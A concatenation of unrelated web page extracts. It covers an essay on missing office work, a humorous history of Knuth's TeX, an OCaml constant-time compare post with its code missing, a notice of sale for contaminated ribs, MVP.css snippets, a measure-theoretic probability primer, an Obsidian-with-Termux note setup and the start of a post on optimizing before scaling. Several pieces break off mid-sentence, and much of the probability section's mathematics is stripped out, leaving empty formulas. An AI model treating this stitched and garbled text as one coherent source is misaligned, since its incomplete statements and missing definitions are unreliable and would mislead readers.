		<div><p>I went into my office yesterday for the first time in a few months to pick some stuff up. We got notified
a couple of days ago to get any personal property out of the office before Thanksgiving or else it'd be
thrown out, so I guess we're moving out of the office<sup id="fnref:moving-out"><a href="#fn:moving-out">1</a></sup>. It was a pretty eerie place to be; even now, 8
months later, most people haven't been back and it kind of looks like the entire office was abducted by aliens in
early March.</p>

<p>Despite how weird it is, I still miss working out of the office.</p>
<!-- more -->

<p>I miss having a clean delineation between "work" and "home".</p>
<p>I miss having copious desk space and a big monitor<sup id="fnref:house"><a href="#fn:house">2</a></sup>.</p>
<p>I miss the 48" TVs on the wall showing Grafana dashboards with key metrics so there was always ambient knowledge of
what was going on with the product.</p>
<p>I miss having meetings in conference rooms where you can see other people and have a giant whiteboard to sketch on.</p>
<p>I miss casual collaboration. Video chat is a poor substitute and Slack is a deeply irritating tool that combines the
worst aspects of synchronous and asynchronous communication.</p>
<p>I miss productivity! Our engineering productivity has fallen through the floor since COVID despite everyone
working longer and harder; I fundamentally do not think remote teams can <em>ever</em> be as productive as in-person teams.</p>
<p>I miss having my employer pay for electricity and heat and fast symmetric multi-gigabit Internet access instead of
shifting those costs to me.</p>
<p>I miss having a plethora of convenient and delicious options for take-out lunch! I miss the gyros and french fries
at <a href="https://www.ayolagreek.com/">Ayola</a>. I miss the chicken pesto sandwich at <a href="https://working-girls-cafe.square.site/">Working Girls'
Cafe</a>. I miss the chow mein and pork buns from <a href="https://yanksing.com/">Yank Sing</a>. I
miss the katsu curry from <a href="http://www.muraccis.com/">Muracci's</a>. I miss the curry burritos from <a href="https://www.curryupnow.com/">Curry Up
Now</a>. I miss the croque monsieur from <a href="https://cafemadeleinesf.com/">Cafe Madeline</a>. I
miss the $5 lunch specials from <a href="http://www.mehfilindian.com/">Mehfil</a>.</p>
<p>I miss the succession of friendly baristas at our <a href="https://www.yelp.com/biz/hermanos-coffee-juice-san-francisco">favorite coffee shop</a> who always knew our orders and put up with our banter.</p>
<p>I miss occasional after-work drinks at the <a href="https://sf.eater.com/2019/4/25/18516128/skydeck-spirits-in-the-sky-rooftop-bar-san-francisco">sky bar</a> with the $18 well drinks that we always convinced management to pay for.</p>
<p>Hell, I miss <a href="https://www.bart.gov/">BART</a> in all its loud and smelly glory.</p>
<p>Look, I know, it's not all bad. It's a lot easier taking care of a baby while working from home than it would be if
I were commuting 45 minutes each way every day. I'm spending a lot less money on food and coffee and BART. And I'm
not arguing that we should be in the office now; not a single one of those things I listed above is worth the health
risk of jamming 150 people<sup id="fnref:deniers"><a href="#fn:deniers">4</a></sup> into an open-plan office with a quasi-functional ventilation
system<sup id="fnref:ventilation"><a href="#fn:ventilation">3</a></sup>. But I
really hope that office-work isn't a permanent victim of this pandemic, that all the companies pushing for
permanent WFH to save a few bucks on rent reconsider their stances, and that there comes a time when I can go back to
work again.</p>

November 21, 2020 | https://yakshav.es/the-patron-saint-of-yakshaves/ | <a href="https://web.archive.org/web/*/https://yakshav.es/the-patron-saint-of-yakshaves/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>In 2015, I gave a talk in which I called <a href="https://speakerdeck.com/skade/tex-the-ultimate-yakshave">Donald Knuth the Patron Saint of Yak Shaves</a>. The reason is that Donald Knuth achieved the most perfect and long-running yak shave: TeX.</p>
<p>I figured this is worth repeating.</p>
<h2 id="how-to-achieve-the-ultimate-yak-shave">How to achieve the ultimate Yak Shave</h2>
<p>The ultimate yak shave is the combination of improbable circumstance, the privilege to be able to shave at your hearts will and the will to follow things through to the end. Here’s the way it was achieved with TeX. The recount is purely mine, inaccurate and obviously there for fun. I’ll avoid the most boring facts that everyone always tells, such as <a href="https://en.wikipedia.org/wiki/Knuth_reward_check">why Knuth’s checks have their own Wikipedia page</a>.</p>
<p>So, let’s get things started.</p>
<h2 id="the-pre-shave">The Pre-Shave</h2>
<p>TeX was invented to typeset a book. No plural. It was invented to typeset the second edition of “The Art of Computer Programming”. The second edition had to be typeset again, as “hot type” typesetting, which was used for the first edition, was not available anymore. Being unimpressed by the available options, Knuth decided to write his own system, which later ended up as TeX.</p>
<p>But “The Art of Computer Programming” is an impressive book in its own right: it is still unfinished, currently spanning 3.5 volumes (yes, the fourth is unfinished, but the first chapters are released). It was called a book of the century by <a href="https://web.archive.org/web/20080820030403/http://www.americanscientist.org/bookshelf/pub/100-or-so-books-that-shaped-a-century-of-science">American scientist writers</a>.</p>
<p>Yak shave -2: Write a book of the century</p>
<p>Digging deeper into TAOCP, it already shows the works of a yak shaver destined for greater things. All programs in this book refer to a common assembly language: MIX. Which was invented for the book.</p>
<p>Yak shave -1: Invent your own computer for illustration purposes</p>
<h2 id="implementation">Implementation</h2>
<p>The first version of TeX was implemented using the <a href="https://en.wikipedia.org/wiki/SAIL_(programming_language)">SAIL</a> programming language. It was later replaced by WEB. What’s WEB? It’s a programming language, invented by… You’ll have guessed it by now, Donald Knuth. It transpiles to PASCAL. Knuth transpiled the WEB before it was cool.</p>
<p>Yak shave 1: Somewhere along the road, implement your own programming language…</p>
<p>WEB is a special language: in WEB, any bare text is just text. It’s interleaved with marked pieces of code, which are later used for the program code. The documentation can be run through a special program to produce… a TeX file. The concept is called “literate programming” and was introduced by… Donald Knuth.</p>
<p>Yak shave 2: Invent your own programming paradigm for it</p>
<p>But, what does TeX do? Mainly, it does text layout and a couple of other things. Knuth being known for research on algorithms couldn’t do without coming up with his own algorithm, later published together with Michael Plass. What does the algorithm do? It finds a visually pleasing way to lay out a paragraph on a page without making line breaks look jarring (for example by adjusting the “glue”, the whitespace between words). Here’s a <a href="https://www.ugrad.cs.ubc.ca/~cs490/2015W2/lectures/Knuth.pdf">nice explanation</a>.</p>
<p>It’s still considered good and has a huge factor in the recognisable look of TeX documents.</p>
<p>Yak shave 3: Invent your own layout algorithm for it</p>
<p>Which brings us to the next problem: <em>what</em> does this thing lay out? Generically speaking: objects and clusters of objects of varying sizes. Interestingly, that’s what TeX deals with, it has no concept of a character other then dimensions.</p>
<p>Nevertheless, these are usually characters and characters are provided by fonts. Fonts must usually be licensed at a fee and free fonts weren’t so available in the 70s.</p>
<p>Another very recognisable feature of TeX documents that they are often set in a font called “Computer Modern”.</p>
<p>I’m trying to make this whole thing a bit more thrilling, so I will let you guess who created that one.</p>
<p>Yak shave 4: Design a font</p>
<p>Fonts need to be authored. Usually, they are described in some vector description, often Bézier curves. This is fairly standard and not an innovation of Knuth. <em>But</em>, he wrote a description language for that, along with an interpreter to turn this descriptions into proper font files. This is <a href="https://en.wikipedia.org/wiki/Metafont">METAFONT</a>. It’s not strictly part of TeX, it’s just that the Yak happened to stand close.</p>
<p>Yak shave 5: Write an authoring tool for fonts</p>
<p>As a side-note, METAFONT was later evolved into METAPOST for generic vector drawings, which has the one feature I still miss from many modern graphics description languages: the ability to describe an (addressable) point as the intersection between two other primitives.</p>
<p>Another side-note: both TeX and METAFONT still see releases, at a slow pace. TeX is currently at version 3.14159265, METAFONT at 2.7182818. Yep, TeX is slowly converging towards pi, while METAFONT towards e. Take that, semantic versioning advocates!</p>
<p>Yak shave 6: Come up with your own versioning scheme<br>
Yak shave 7: Avoid adoption of it for greater good</p>
<p>We’re not done yet. We can layout text (and other things), but where do we convert it to? Now, everyone knows the horror printers invoke, so no one wants to deal with those directly. Classic TeX instead converts things to <a href="https://en.wikipedia.org/wiki/Device_independent_file_format">DVI</a>, the “device independent” format. I don’t know many details about it, except what’s on the wiki page, which feels the need to specifically point out that “DVI is not a document encryption format”. It is again a stack-based language (in contrast to PostScript not turing complete), which can then be interpreted through a driver, which would then send that to whatever target (a printer, PDF or such). It was designed by…</p>
<p>David R. Fuchs, Knuth just wrote the implementation.</p>
<p>Yak shave 8: Implement a custom language for printable documents</p>
<p>Note that I haven’t mentioned that TeX is an… interesting… language by itself, but I don’t consider that a yak shave, this was just the implementation.</p>
<p>That makes most of the initial implementation complete. Which means, in orderly fashion, you should give matters in the hand of the community.</p>

<p>Since the release of TeX, the community has been busy working on using it as a platform. If you ever downloaded the full TeX distribution, please bear in mind that you are downloading the amassed work of over 40 years, to make sure that each and every TeX document ever written builds. We’re talking about documents here.</p>
<p>But mostly, two big projects sprung out of that. The first is LaTeX by Leslie Lamport. Lamport is a very productive researcher, famous for research in formal methods through TLA+ and also known laying groundwork for many distributed algorithms. LaTeX is based on the idea of seperating presentation and content. It is based around the idea of document classes, which then describe the way a certain document is layed out. Think Markdown, just much more complex. The second is ConTeXt, which is far more focused on fine grained layout control.</p>
<p>Both share a common property:</p>
<p>Community yak shave 1: Create not one, but two programs that are very ungoogleable… Before Google is invented.</p>
<p>Being active in a language that has lingo built around “Rust”, “Cargo” and “manifests”, I feel right at home.</p>
<p>Now, the community also wants to evolve TeX: a lot has changed over the years in technology, so, for example, you’d like to use modern font formats, directly write to modern output formats or use this new UTF-8 thingy. For that, there are specialised TeX interpreters, such as <code>pdf(la)tex</code>, <code>lua(la)tex</code> and <code>xe(la)tex</code>. There’s a problem here: you are not allowed to change TeX and distribute <a href="https://en.wikipedia.org/wiki/TeX#License">it under that name</a>. The thinking here is that if you have a <code>tex</code> binary, you can compile any valid TeX from the past and from the future.</p>
<p>The first issue on that road is that WEB isn’t really a popular programming language, neither is PASCAL and running it on modern systems is a bit of a pain. Which means…</p>
<p>Community yak shave 2: Transpile WEB to C and work from there</p>
<p>This is just the start of a great endeavour…</p>
<p>Community yak shave 3: Build a lot of tooling around that</p>
<h2 id="the-moral-of-the-story">The Moral of the Story</h2>
<p>Whenever you feel like “can’t we just replace this whole thing, it can’t be so hard” when handling TeX, don’t forget how many years of work and especially knowledge were poured into that system. Typesetting isn’t the <em>most</em> popular knowledge around programmers. Especially see it in the context of the space it is in: they can’t remove legacy. Ever. That would break documents.</p>
<p>TeX is also not a programming language. It might resemble one, but mostly, it should be approached as a typesetting system first. A lot of its confusing lingo gets much better then. It’s not programming lingo.</p>
<p>By approaching TeX with an understanding for its history, a lot of things can be learned from it. And yes, a replacement would be great, but it would take ages.</p>
<p>In any case, I hope I thoroughly convinced you why Donald Knuth is the Patron Saint of Yak Shaves.</p>

<p>This comes out of a enjoyable discussion with <a href="https://lambdaisland.com/">Arne from Lambda Island</a>, who listened and said “you should totally turn this into a talk”.</p>

<p><a href="https://github.com/mirage/eqaf">eqaf</a>, a constant-time compare function implementation in <a href="https://ocaml.org/">OCaml</a>, is a great case to demonstrate the <a href="https://signalsandthreads.com/language-design/#0008401">predictable performance of OCaml’s compiler</a>. Why?</p>
<ul>
<li>The goal of a constant-time compare function is to avoid <a href="https://en.wikipedia.org/wiki/Timing_attack">timing attacks</a>, which requires fully deterministic and predictable runtime performance.</li>
<li>Usually, cryptography functions are written in assembly to have total control of resulting binary and avoid unneeded optimization by the compiler.</li>
<li>However, <a href="https://github.com/mirage/eqaf">eqaf</a> showed us that you can write clean OCaml and get simple and predictable resulting assembly.</li>
</ul>

<p>This is the first issue of <a href="https://learnocamlthehardway.substack.com/welcome">Learn OCaml the Hard Way</a>. A publication about learning OCaml from the ground up.</p>

<h2 id="about-garbage-collection">About Garbage Collection</h2>
<p>It’s hard to have a stable runtime performance for languages that comes with a garbage collector. To have a predictable runtime performance characteristic in these languages, the following rules are usually required to be followed religiously:</p>
<ul>
<li>Avoid garbage collections by avoiding memory allocations.</li>
<li>Avoid boxed values to generate assembly as low-level as possible.</li>
</ul>
<p>Hence, the resulting code are usually unidiomatic and hard to maintain.</p>
<h2 id="compiler-explorer">Compiler Explorer</h2>
<p><a href="https://godbolt.org/">Compiler Explorer</a> is a handy tool for exploring compilers and its assembly output. It has built-in OCaml support and removes boilerplate automatically. I recommend you to test the following example with it.</p>

</code></pre></div><p>Besides basic OCaml syntaxes[1], interesting bits in the example are:</p>
<ul>
<li>
<p>You can force OCaml to always inline a function via adding an attribute <code>[@inline]</code></p>
</li>
<li>
<p><code>String.unsafe_get</code> works like <code>String.get</code> but without bound-checking. It’s unsafe for most use-cases but it’s used here to <a href="https://github.com/mirage/eqaf/blob/master/lib/eqaf.ml#L3">avoid jumping to exception</a>.</p>
</li>
<li>
<p>OCaml provides a FFI <code>external</code> for <a href="https://caml.inria.fr/pub/docs/manual-ocaml/intfc.html">interfacing with C</a>. Here we use it to call a primitive function provided by OCaml’s runtime <code>%caml_string_get16u</code>.</p>
<ul>
<li><code>external</code> is always unsafe and should be really take care about.</li>
<li>Primitives are not stable. For example: <a href="https://github.com/mirage/ocaml-base64/pull/36">https://github.com/mirage/ocaml-base64/pull/36</a></li>
</ul>
</li>
<li>
<p><code>n asr m</code> shifts <code>n</code> to the right by <code>m</code> bits. This is an arithmetic shift: the sign bit of <code>n</code> is replicated. The result is unspecified if <code>m &lt; 0</code> or <code>m &gt; Sys.int_size</code>.</p>
</li>
<li>
<p><code>ref</code> creates a <a href="https://dev.realworldocaml.org/imperative-programming.html">reference cell</a> and allows in-place replacement with <code>:=</code>.</p>
</li>
<li>
<p><code>pred x</code> is <code>x - 1</code>.</p>
</li>
<li>
<p><code>lor</code>, <code>lxor</code>, and <code>land</code> are logical bit-wise <code>or</code>, <code>xor</code>, and <code>and</code>.</p>
</li>
</ul>
<p>Although the OCaml code is quite low-level (and not very functional). It’s still cleaner than most constant-time compare functions implemented in assembly.</p>

<h2>Public Notice of Sale: CBQ, LLC and Carl Buddig Company – Auction of 191,075 lbs. of St. Louis Style Ribs</h2>
<p>CBQ, LLC and Carl Buddig Company (“CBQ”) is offering for sale pursuant to 810 Ill. Comp. Ann. 5/2-706 approximately 191,075 lbs. of frozen St. Louis Style ribs. CBQ advises that it is selling the ribs because Canadian American Boxed Meat Corp. refused to return the purchase price after CBQ revoked its acceptance of the ribs. CBQ advises it revoked its acceptance because the ribs contained metal particles from rusted, galvanized steel and 400-series steel. The ribs are located at 15600 Wentworth Ave., South Holland, IL 60473. The CBQ is selling the ribs “as-is” “where-is” with no warranties or representations of any kind.

                <p>If you just want to launch already.</p>
                <p><sup>PRO TIP</sup> An MVP is a temporary site, it doesn't have to be <i>and shouldn't be</i> perfect.

                <summary>What if I don't like the default styles?</summary>
                <p>Most styles are editable through <em>CSS variables</em>. You can also add your own styles
                    inline, at the end of MVP.css or in a new stylesheet.</p>
                <p><sup>PRO TIP</sup> If there are two conflicting CSS styles, the last one will take precedence.</p>
                <pre>                    <code>
:root {
    --color: #118bee;
}

/* Lower in the CSS, or in a 2nd stylesheet */

:root {
    --color: green; /* This will take precedence */
}
                    </code>
                </pre>
            </details>
            <details>
                <summary>What if I still don't like it?</summary>
                <p>That's OK, you probably shouldn't love your MVP. The goal of MVP.css is to help you
                    feel <i>slightly</i> less embarrased about it.</p>

<p>Probability is a measure defined on events, which are sets of primitive outcomes. Probability theory mostly comes down to constructing events and measuring them. A measure is a generalization of size which corresponds to length, area, and volume (rather than the bijective mapping definition of cardinality).</p>

<p>The first half of this article is ostensibly devoted to explaining the definition of probability, but that is not my priority. I’m most interested in providing a useful conceptual map, asking and discussing interesting questions, and developing intuition. I provide many links to technical details and further readings. My opening exposition on definitions is brief. If it does not all make sense, please look at other resources. Hopefully this article at least makes those other sources easier to use.</p>

<p>This post is also a pedagogical experiment. I structured this article to be read twice. The first pass is without measure theory, and the second pass is with measure theory. Measure-theory content is hidden by default, e.g. <span><span>like this</span></span>. Simply ignore <span><span>purple text</span></span> the <span><span>first time</span><label for="796b5f2304883e2b8a1737199bea4fcbd95c2af7"> ⊕</label><span><span>Unless you are already acquainted with measure theory, but then you can just look at <a href="https://en.wikipedia.org/wiki/Probability_axioms#Axioms" target="_blank" rel="noopener noreferrer">Wikipedia’s definition of probability</a> to understand the gist of probability theory.</span></span></span> you read this post. Then in the <a href="#primer-to-measure-theory">measure theory section</a> at the end of this post you will see a button to show all the hidden text (and you can just click on <span><span>purple text</span></span> anywhere in the post to show it).</p>

<p>Why? Because I see plenty of introductions to probability that leave out measure theory entirely. The problem with them is that a lot of the common probability notation, e.g. random variables, only really makes sense when you understand measures. On the other hand, if you crack open a rigorous text on probability theory (e.g. <a href="https://www.goodreads.com/book/show/383472.Statistical_Inference" target="_blank" rel="noopener noreferrer">Casella &amp; Berger</a> or <a href="https://www.springer.com/gp/book/9780387953823" target="_blank" rel="noopener noreferrer">Shao</a>), it may not be obvious why all this extra complexity with events, sigma-algebras and measure spaces is necessary.</p>

<p>When learning about probability and measure theory myself, I wish I had a resource that both provides precise definitions and intuitions for why these definitions are the way they are, and without wading through a lot of extraneous details. I don’t know if I’ve succeeded in that here, but this is my attempt.</p>



<h2 id="beginner"><a href="#beginner">Beginner</a></h2>

<p>The full definition of probability is below, but to avoid overwhelm, you may first look at this <em>attempt</em> at defining probability. Many people intuitively think of probability this way. Notably, I’ve left out the event space.</p>

<p><strong>Sample set</strong> $\Omega$ is a set of all possible <span><span>samples</span><label for="46f0a5784f51b77c385f44317a48bc352dcfb439"> ⊕</label><span><span>Sample is synonymous with <a href="https://en.wikipedia.org/wiki/Outcome_(probability)" target="_blank" rel="noopener noreferrer">outcome</a>.</span></span></span> $\omega\in\Omega$.

<p>The beginner definition above does not define an event space. This is actually a problem when working with uncountable sample spaces, because not all subsets of an uncountable space can be measured. If that statement confuses you, don’t worry about it and read through this post. Then read my <a href="#primer-to-measure-theory">primer to measure theory</a> at the end which outlines why not every set can be measured. Though this may seem like a minor technicality, specifying what sets can be measured allows probability theory to be <span><span>a lot more general than it otherwise could be,</span><label for="a0359426bd6a552c43a72d1b7b5e568b41b95f0d"> ⊕</label><span><span>This is Kolmogorov’s achievement.

<p>Here is a compact but complete definition of probability:</p>
<ul>
  <li>

      <li>
<strong>Sample</strong> $\omega \in \Omega$ (i.e. primitive outcome) is a possible state of the world. Samples are disjoint, meaning only one sample can be the case at a time. Samples can be any kind of mathematical object.</li>
    </ul>
  </li>
  <li>
<strong>Event space</strong> $E \subseteq 2^\Omega$ is the set of subsets of $\Omega$ for which we are <span><span>allowed to assign probability.</span><label for="f8b43cebd8d878851c96f6b83253241ae0914c18"> ⊕</label><span><span>The sets omitted from $E$ are not measurable, but again if you are not familiar with measure theory don’t worry about why some sets cannot be measured until the end of this post.</span></span></span> We require that $\emptyset, \Omega \in E$ <span><span>and $E$ is required to be a <a href="#sigma-algebra">$\sigma$-algebra</a> that contains the measurable subsets of $\Omega$. The tuple $(\Omega, E)$ is a <a href="https://en.wikipedia.org/wiki/Measurable_space" target="_blank" rel="noopener noreferrer">measurable space</a>.</span></span>
    <ul>
      <li>
<strong>Event</strong> $e \in E$ is a <span><span>measurable</span></span> set of samples.

  <li>
<strong>Probability measure</strong> <span><span>$P : E \to [0, 1]$</span><label for="4ad9ab16708369ac059ab042be9927eff00636f9"> ⊕</label><span><span>In general a measure $Q : E \to \real_{\geq 0}$, but I’m including the restriction of the co-domain to the unit interval $[0, 1]$ in the definition of , because we are only talking about probability measures here, and there’s no reason to be more general.</span></span></span> is a function that maps allowed subsets of $\Omega$ to the real unit interval. $P$ is a <strong>measure</strong>, which means it satisfies certain properties that make it behave analogous to length, area, volume, etc. in Euclidean space. Essentially, a measure is a generalization of size that satisfies the following properties:
    <ul>
      <li><span><span><strong>Measurable domain</strong>: $E$ is a $\sigma$-algebra of measurable sets.</span></span></li>
      <li>

<p>The triple $(\Omega, E, P)$ defines a <a href="https://en.wikipedia.org/wiki/Probability_space" target="_blank" rel="noopener noreferrer">probability space</a> <span><span>which is also a <a href="https://en.wikipedia.org/wiki/Measure_space" target="_blank" rel="noopener noreferrer">measure space</a>.</span></span> These three objects are all we need to do probability calculations.</p>

<h2 id="kolmogorov-axioms-of-probability"><a href="#kolmogorov-axioms-of-probability">Kolmogorov axioms of probability</a></h2>

<p>You may have heard of the <a href="https://en.wikipedia.org/wiki/Probability_axioms#Axioms" target="_blank" rel="noopener noreferrer">Kolmogorov axioms of probability</a>. Kolmogorov formalized probability as a special case of measure theory. Essentially a probability measure is a normalized measure, i.e. assigns 1 to the entire sample space $\Omega$. Above, I’ve merged the axioms of measure theory with Kolmogorov’s axioms. For reference, here are Kolmogorov’s axioms given separately:</p>
<ol>
  <li>$P(e) \in [0, 1], \forall e \in E$, where $[0, 1] \subset \real$.</li>
  <li>$P(\Omega) = 1$, i.e. probability of anything happening is 1.</li>
  <li><span><span><a href="https://en.wikipedia.org/wiki/Sigma_additivity" target="_blank" rel="noopener noreferrer">$\sigma$-additivity</a> on $E$.</span></span></li>
</ol>

<p><span><span>Given the axioms of measure theory, we can define probability succinctly by simply stating that $(\Omega, E, P)$ is a measure space where $P(\Omega) = 1$ (see <a href="https://terrytao.files.wordpress.com/2011/01/measure-book1.pdf" target="_blank" rel="noopener noreferrer">Terence Tao’s Introduction to Measure Theory</a>).</span></span></p>

<p><strong>Finite</strong>: Dice rolls</p>

<p>,<br>
,<br>
.</p>

<p>Note that  is not defined. $P$ measures the “size” of sets.  is the set containing one sample. We can also compute the probability of larger sets, e.g.<br>

,<br>
.</p>

<p><strong>Countable</strong> (event set): Variable length binary sequences</p>

<p> is the binary alphabet.<br>
Let $x \in \bin^n$ be a binary sequence of any length $n$, and  returns the length of $x$.</p>

<p>The sample set is all infinite binary sequences, .<br>
This let’s us make an event for each finite length $x$.<br>
Let , where  is the length $\len{x}$ prefix of $\omega$.<br>
The event set is </p>

<p>Then  is the probability of $x$, and  is the probability of the set .<br>
Note that the probability of a finite sequence is always a marginal probability, in the sense that  where  and  are the concatenations of  with 0 or 1.</p>

<p>An example of such a measure is the uniform measure, .</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		
		<span>November 20 2020</span>
		
		<p>In the latest chapter of <a href="https://www.thegadhian.com/posts/getting-your-shit-together">getting my shit together</a>, I've moved all my notes from <a href="https://www.notion.so/">Notion</a> to <a href="https://obsidian.md/">Obsidian</a>. In this post, I talk a bit about why I think it's cool, and how I use it on my mobile.</p>
<h2>What is Obsidian?</h2>
<p>Obsidian is the latest in the recent vogue of "Second Brain" apps. Essentially it's a place to take notes, and capture ``[[relationships]]` between those notes, resulting in something like your own personal Wikipedia.</p>
<p><img src="https://www.thegadhian.com/posts/using-obsidian-with-termux-and-vim/obsidian.png" alt="My knowledge graph in Obsidian"></p>
<h2>How do I use it?</h2>
<ol>
<li><strong>Daily Notes</strong>: this is where I spend most of my time, capturing anything interesting that happened that day, tasks that come up etc. If something warrants more thought, I'll later turn it into a note of it's own.</li>
<li><strong>Work</strong>: I'll usually keep note files for people (to store notes from 1-1s, anything interesting about them), projects, and occasionally meetings - relating them all together. I'll also create separate notes for any opnions that I'm forming.</li>
<li><strong>Learning</strong>: anything I'm learning about, or reading/watching that I might want to remember later will have a note.</li>
</ol>
<p>I don't really know if it's <a href="https://zettelkasten.de/posts/overview/#the-introduction-to-the-zettelkasten-method">zettelkasten</a>, <a href="https://notes.andymatuschak.org/Evergreen_notes">evergreen notes</a>, or <a href="https://gettingthingsdone.com/what-is-gtd/">GTD</a>, or <a href="https://bulletjournal.com/">bullet journaling</a>. It doesn't really matter.</p>
<h2>Why switch from Notion?</h2>
<p>Notion is great, and definitely does a lot of things better than Obsidian does (particularly in the project management space). I had an awfully elaborate setup with Notion, with all sorts of relational databases. I found that this added a lot of overhead, both for capturing notes and navigating them.</p>
<p>The selling point of Obsidian for me was that all the notes are (more or less) regular markdown, and stored on <a href="https://plaintextproject.online/index.html">plain text files</a> on your own hard drive. There was something rather romantic about the idea of actually owning your own thoughts. Even if the app disappears one day, my notes will still be there in a usable format.</p>
<p>This emphasis on just writing text, and navigating organically through the graph feels like it's led to me writing more.</p>
<h2>What about mobile?</h2>
<p>The caveat was that Obsidian currently only has a desktop app. It's on their <a href="https://trello.com/b/Psqfqp7I/obsidian-roadmap">roadmap</a>, which the two-person team seem to be blistering through.</p>
<p>However the beauty of having plain text files is that I can do <em>whatever I want</em> with them. This is how I've set up my mobile note-taking.</p>
<h3>Syncthing</h3>
<p>To get the files onto my phone (and between my laptops), I use an open source app called <a href="https://syncthing.net/">Syncthing</a>. This works a bit like <code>rsync</code>, and does it's best to keep the files in sync across any connected devices. As most of my notes are small, self-contained files, conflicts tend to be quite rare.</p>
<h3>Termux</h3>
<p>While there are a handful of markdown editing apps available on Android, I prefer to stick with the soothing familiarity of VIM to do my editing. To achieve this, I use an <em>incredible</em> app called <a href="https://termux.com/">Termux</a>.</p>
<p>Termux is a terminal emulator with a large collection of Linux packages - which allows you to use things like git, node.js, ssh, and VIM all from the comfort of your tiny phone.</p>
<pre><code>termux-setup-storage
pkg update
pkg install vim
</code></pre>
<p>With these three commands, I was able to setup Termux to be able to see my synced vault folder, and edit with VIM.</p>
<p><small>(*<em>Okay I also installed git and cloned my dotfiles and installed all my regular VIM plugins. But you get the gist.</em>)</small></p>
<p>One slight annoyance is the the folder will be in different places on each device. To handle that, I have a <code>.extra</code> file to keep environment-specific config, to which which I've added:</p>
<p><code>export KB_DIRECTORY=/storage/shared/kb</code></p>
<h3>VIM</h3>
<p>While it was great to edit the files in VIM, without the graph view and backlink support it was a lot harder to navigate..</p>
<p>Fortunately, with a few additional lines to <code>.vimrc</code>, we can make this easier!</p>
<pre><code>autocmd BufNewFile,BufRead *.md setlocal filetype=markdown
autocmd BufRead,BufNewFile $KB_DIRECTORY* setlocal path+=$KB_DIRECTORY/**
set suffixesadd+=.md
</code></pre>
<p>These three lines do the following:</p>
<ol>
<li>Set the filetype to markdown for md files, which gives us some syntax highlighting</li>
<li>If I'm in any file in the knoweldge base, set my <code>path</code> to include all subdirectories of that folder. This means that when using <code>gf</code> to "go to file under cursor", or using <code>:find</code> to find a file, we can look at all then notes in any of my subdirectories.</li>
<li>Add <code>.md</code> to the list of "default" suffixes. When using <code>gf</code> to navigate to a file, VIM will try all theses suffixes as it looks for the file in the path.</li>
</ol>
<p>The combination of the above means that if I have a [[Backlink]] that points to <code>/SubFolder/Backlink.md</code>, I can put my cursor over the [[Backlink]], hit <code>gf</code> and VIM will be able to navigate to that file. Success!</p>
<h3>Termux API &amp; Widget</h3>
<p>So I now have the ability to edit my notes on my phone, but it's still a bit of a faff. Ideally on a mobile, I'd want to be able to quickly capture a note, and easily find a particular note to refer to.</p>
<p>The first thing I want is the ability to capture a note quickly. As the notes are plain text files, I can easily manipulate them with bash.</p>
<p>I have a bash function that will find or create the daily note file for today's date, and append whatever I type as a bullet to that file.</p>
<pre><code>today() {
	now=$(date +"%Y-%m-%d");
	if ([[ -z $1 ]]); then
		vim "$KB_DIRECTORY/Daily/$now.md"
	else
		echo $"- $@" &gt;&gt; "$KB_DIRECTORY/Daily/$now.md"

	fi
}
</code></pre>
<p>This allows me, wherever I am in the CLI, to type <code>today I did some stuff</code>, and it will add that to my note!</p>
<p>I have a similar (imperfect) function to be able to fuzzy find any note in my knowledge base:</p>
<pre><code>kb() {
	existing=$(find $KB_DIRECTORY -iname \*"$*"\*.md | head -n 1)
	if ([[ -n "$existing" ]]); then
		vim "$existing"
	else
		vim "$KB_DIRECTORY/$*.md"
	fi
}
</code></pre>
<p>This function allows me to type <code>kb obsidian</code> and it will find the first match it finds with obsidian in the name.</p>
<p>That's all well and good, but still involves opening up Termux and typing a bunch a stuff in. Termux has some additional packages that can be installed, which further integrate it with the Android OS.</p>
<p>In particular, I use Termux API, and Termux Widget.</p>
<p><code>pkg install termux-api</code></p>
<p>Termux allows you to create bash scripts in <code>~/.shortcuts/</code> (or <code>~/.shortcuts/tasks</code> for background tasks), which can then be accessed from a homescreen widget. And with Termux API, we can use some of the OS's input facilities. So, I can have a shortcut like the below:</p>
<pre><code>#!/data/data/com.termux/files/usr/bin/bash
source ~/.functions
source ~/.extra

result=$(termux-dialog -t "Note" | jq -r '.text');

today "$result"
</code></pre>
<p>This script opens up a Dialog box which lets me type in a note, uses jq to parse the JSON result of that dialog and extract the text, and uses the <code>today</code> bash function from earlier to capture it in my daily note!</p>
<p>Even better, we can do the same thing with a voice note!</p>
<pre><code>result=$(termux-dialog speech -t "Note" | jq -r '.text');
</code></pre>
<h2>The Result</h2>
<p>Behold, in all it's nerdy goodness:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>

        
        

        
<p>
A lot of tech discussion these days is focused around scaling web app infrastructures to handle huge traffic.
</p>
<p>
Hacker News abounds with posts about Kubernetes, distributed systems and database replication; the <a href="https://github.com/donnemartin/system-design-primer" target="_blank">Large-Scale System Design Primer</a> on GitHub is extremely well-loved (113k stars) and chock full of advice on memcache clusters and DB sharding.
</p>
<p>
In all the heady excitement of getting your web-based notepad app ready to handle 10 billion daily users, it's important not to forget the power of modern computing hardware and how far simple optimizations can go.
</p>
<p>
You're probably not Facebook. Setting up FAANG-level infrastructure won't make your company into a FAANG, any more than a cargo cult can summon supply-bearing planes by building fake runways and wooden ATC towers. 
</p>
<p>
There's a place for big, scalable cluster infrastructures, but it's a larger scale than many organizations think.
</p>
<h3>The case for optimizing</h3>

<p>
It may sound obvious, but - optimizing your app to fulfill a request in 1/10 the time is like adding 9 servers to a cluster. Optimizing to 1/100 the time (reducing requests from say 1.5 sec to 15ms) is like adding 99 servers. 
</p>
<p>
That's a 1U server doing the work of <em>two 42U server racks</em>, formerly busy turning inefficient code into heat. 
</p>
<p>
That may be an extreme case - but unnecessary bloat is common, and these kinds of gains could be as simple as adding a well-chosen index to speed up a common query by 10x or 100x, or caching some seldom-changing response in memory rather than re-rendering it every time. 
</p>
<p>
Optimizing is good for the world, too:
</p>
<ul>
<li>1/10 or 1/100 the carbon footprint</li>
<li>Cleaner, more maintainable code and systems - optimizing often just means simplifying and removing unnecessary parts</li>
<li>Snappier experience for users (latency is generally lower if you can optimize enough to run on a single server rather than a bunch of networked ones)</li>
<li>Reduced hosting costs</li>
<li>Happier users - developers can focus more on solving users' problems and less on infrastructure</li>

</ul>
<p>
